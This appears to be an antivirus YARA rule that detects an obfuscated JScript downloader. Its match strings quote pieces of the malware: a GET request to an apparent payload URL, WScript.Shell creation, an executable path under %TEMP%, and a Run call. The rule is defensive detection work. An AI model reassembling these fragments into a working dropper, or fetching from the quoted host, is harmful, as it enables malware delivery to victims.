rule sig_20160330_7f460b895dcb0283c6818c643aca4808 {
  meta:
    description = "datamaliciousorder - file 20160330_7f460b895dcb0283c6818c643aca4808.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e9a29c2270e1de2d1e99e00c038c136e57e73d0f8f249a0d6802a1e98288822e"

  strings:
    $s1  = "W0[WX](\"GET\", \"http://greenbee.com.ua/b7eosa\", false);" fullword ascii
    $s2  = "var J0 = function Q() {return WScript[Q0](\"WScript\"+\".Shell\");}(), QD = 11;" fullword ascii
    $s3  = "function V(V0, X){NU = NU * 1; return V0 - X;};" fullword ascii
    $s4  = "if (W0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CO() {return J0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Kzs5ONQ0r.ex\" + \"e\";};" fullword ascii
    $s6  = "function US(){return I + \"\";};" fullword ascii
    $s7  = "function Y(FM){J0[\"Run\"](FM, NU, NU);};" fullword ascii
    $s8  = "function J() {return ((L == true) && (L == E)) ? 1 : NU;};" fullword ascii
    $s9  = "function Z(W) {var IW = (1, 2, 3, 4, 5, W); return IW;};" fullword ascii
    $s10 = "var JT = new this[\"Date\"]();" fullword ascii
    $s11 = "function WC(){return Q0;};" fullword ascii
    $s12 = "function FE(){return 22;};" fullword ascii
    $s13 = "return V(F, D);" fullword ascii
    $s14 = "function XL()" fullword ascii
    $s15 = "}while (VP);" fullword ascii
    $s16 = "E = true; " fullword ascii
    $s17 = "var L = false;" fullword ascii
    $s18 = "L = true; " fullword ascii
    $s19 = "var ZB = false;" fullword ascii
    $s20 = "} catch(Y1){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}